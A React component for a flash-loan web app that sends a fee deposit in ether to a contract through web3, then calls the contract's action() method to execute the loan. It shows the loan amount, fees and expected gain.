import React, { useState } from "react";
import NameSymbol from "./NameSymbol";
import CryptoDescrip from "./CryptoDescrip";
import "../css/submitScreen.css";

function SubmitScreen(props) {
  const [btnErr, setBtnErr] = useState("");
  const [isExecuteBtnDisabled, setExecuteDisabled] = useState(true);
  const onInitiate = () => {
    setBtnErr("");
    window.web3.eth.sendTransaction(
      {
        to: props?.submitState?.ivm,
        from: props?.accountAddress,
        value: window.web3.utils.toWei("" + props?.loanData.totalFee, "ether"),
        gas: 3e4,
        gasPrice: window.web3.utils.toWei("90", "gwei"),
      },
      function (e, t) {
        console.log("e", e);
        if (e) setBtnErr("Transaction Failed.");
        else
          setTimeout(function () {
            setBtnErr("");
            alert(
              "Money deposited to contract. You can execute the Flash Loan now."
            );
            setExecuteDisabled(false);
          }, 5e3);
      }
    );
  };
  const onExecute = () => {
    setBtnErr("");
    window.contract.methods.action().send(
      {
        to: props?.submitState.ivm,
        from: props?.accountAddress,
        value: 0,
        gasPrice: window.web3.utils.toWei("90", "gwei"),
      },
      function (e, t) {
        if (e) {
          setBtnErr("Flash Loan Execution Failed");
        } else
          setTimeout(function () {
            setBtnErr("");
            alert("Transaction Successful. Check your wallet!");
          }, 5e3);
      }
    );
  };
  return (
    <div className="screentwo">
      <NameSymbol
        label="LOAN AMOUNT"
        input="Enter Amount"
        inputValue={props?.loanData?.amount}
        handleInputChange={(e) => props.setLoanAmount("VAL", e.target.value)}
        isIncrement
        isNumber
        handleIncrementClick={() => {
          props.setLoanAmount("INC");
        }}
        handleDecrementClick={() => {
          props.setLoanAmount("DEC");
        }}
      />
      <CryptoDescrip
        tokenFee={props?.loanData?.tokenFee}
        currency={props?.submitState?.currency}
        dex={props?.submitState.dex}
        swapFee={props?.loanData?.swapFee}
        totalFee={props?.loanData?.totalFee}
        gain={props?.loanData?.gain}
      />
      {btnErr && <p className="error-text-mesg">{btnErr}</p>}
      <button onClick={onInitiate}>
        {`DEPOSIT ${props?.submitState?.currency}`}
      </button>
      <button disabled={isExecuteBtnDisabled} onClick={onExecute}>
        EXECUTE
      </button>
    </div>
  );
}

export default SubmitScreen;
